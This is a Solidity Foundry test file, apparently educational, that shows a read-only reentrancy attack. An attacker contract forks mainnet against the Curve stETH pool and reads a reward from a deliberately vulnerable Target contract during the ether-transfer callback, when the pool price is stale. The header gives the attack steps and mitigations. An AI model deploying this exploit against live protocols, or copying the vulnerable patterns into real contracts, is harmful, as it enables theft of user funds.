// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";
import {IERC20} from "../interfaces/IERC20.sol";
import {ICurve} from '../utils/ICurve.sol';

// forge test --match-contract Exploit_ReadOnly -vvv
/*
So far, no attacks that follow this path were identified. However, it is worth exploring this example for educational purposes.


// Attack Overview
Total Lost: No previous attacks via this path (yet)

// Key Info Sources

Video: https://www.youtube.com/watch?v=0fgGTRlsDxI 


Principle: Read-only reentrancy
    mapping(address => uint256) public userLocked;
    uint256 public totalLocked;

    function withdraw() external nonReentrant {
        require(userLocked[msg.sender] > 0);
        require(address(this).balance >= userLocked[msg.sender]);

        (bool success, ) = payable(msg.sender).call{value: userLocked[msg.sender]}();
        require(success);

        userLocked[msg.sender] = 0;
        totalLocked -= userLocked[msg.sender];
    }


ATTACK:
1) The attacker's contract calls contract A that performs a call open to be hooked (by an ERC777s, ERC1155 or regular ether transfers).
2) The attacker callbackss a contract B that reads for example totalLocked from contract A.
3) As totalLocked was not updated by the call was made, it is reading that contract's A older value (yet not updated).
4) Because of this, the attacker managed to exploit contract B because it read an invalid value of contract A (e.g. price rate manipulation).

MITIGATIONS:
1) For newer contracts, the state mutex of the reentrancy lock could be set as public to allow other contracts check if they are in a reentrant call
2) Also, respect the checks-effects interactions pattern as using reentrancy locks without respecting the pattern opens new attack paths like this one. 


Below we show an example of a read-only vulnerable contract that reads the state 
from another contract where reentrant calls are triggered by ether transfers.

Based in the example made by @SmartContractProgrammer 
https://github.com/stakewithus/defi-by-example/blob/main/read-only-reentrancy/src/Hack.sol
*/

address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant LP = 0x06325440D014e39736583c165C2963BA99fAf14E;

// Vulnerable contract as reads the pool price to calculate the rewards.
contract Target {
  IERC20 public constant token = IERC20(LP);
  ICurve private constant pool = ICurve(STETH_POOL);

  mapping(address => uint) public balanceOf;

  function stake(uint amount) external {
    token.transferFrom(msg.sender, address(this), amount);
    balanceOf[msg.sender] += amount;
  }

  function unstake(uint amount) external {
    balanceOf[msg.sender] -= amount;
    token.transfer(msg.sender, amount);
  }

  function getReward() external returns (uint) {
    uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) / 1e18;
    // Omitting code to transfer reward tokens
    return reward;
  }
}

contract Exploit_ReadOnly is TestHarness {
    AttackerContract internal attackerContract;
    Target internal target;

    address internal attacker = address(0x69);

    function setUp() external {
        cheat.createSelectFork("mainnet");

        cheat.deal(attacker, 110_000 ether);

        target = new Target();
        attackerContract = new AttackerContract(address(target));
    }

    function test_attack() external {
        cheat.startPrank(attacker);
        attackerContract.setup{value: 10 ether}();
        attackerContract.pwn{value: 100_000 ether}();
    }
}

contract AttackerContract is TestHarness{
  ICurve private constant pool = ICurve(STETH_POOL);
  IERC20 public constant lpToken = IERC20(LP);
  Target private immutable target;

  constructor(address _target) {
    target = Target(_target);
  }

  receive() external payable {
    emit log_named_decimal_uint("during remove LP - virtual price", pool.get_virtual_price(), 18);
    // Attack - Log reward amount
    uint reward = target.getReward(); // This step shows how the rewards are calculated if done in a reentrant call.
    emit log_named_decimal_uint("reward", reward, 18);
  }

  function setup() external payable {
    uint[2] memory amounts = [msg.value, 0];
    uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);

    lpToken.approve(address(target), lp);
    target.stake(lp);
  }

  function pwn() external payable {
    // Add liquidity
    uint[2] memory amounts = [msg.value, 0];
    uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
    // Log get_virtual_price
    emit log_named_decimal_uint("before remove LP - virtual price", pool.get_virtual_price(), 18);
    // console.log("lp", lp);

    // remove liquidity
    uint[2] memory min_amounts = [uint(0), uint(0)];
    pool.remove_liquidity(lp, min_amounts);

    // Log get_virtual_price
    emit log_named_decimal_uint("after remove LP - virtual price", pool.get_virtual_price(), 18);

    // Attack - Log reward amount
    uint reward = target.getReward();
    emit log_named_decimal_uint("reward", reward, 18);
  }
}
